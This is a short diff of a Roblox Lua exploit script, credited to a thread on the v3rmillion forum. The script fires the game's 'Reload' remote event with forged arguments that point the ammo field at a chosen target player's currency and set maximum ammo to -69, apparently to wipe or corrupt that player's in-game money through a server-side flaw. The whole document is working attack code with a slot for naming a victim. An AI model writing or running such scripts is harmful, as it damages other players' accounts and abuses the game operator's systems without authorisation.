@@ -1,12 +1,12 @@
 -- ORIGINAL SCRIPT // https://v3rmillion.net/showthread.php?tid=1165198 \\
 
---local player = "target name here" uncomment out this line if you arent running this from the loadstring
+local target = "target name here"
 
 game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
         Name = "[Revolver]",
-        Ammo = game:GetService("Players")[player].DataFolder.Currency,
+        Ammo = game:GetService("Players")[target].DataFolder.Currency,
         MaxAmmo = {Value = -69}
    }
 )
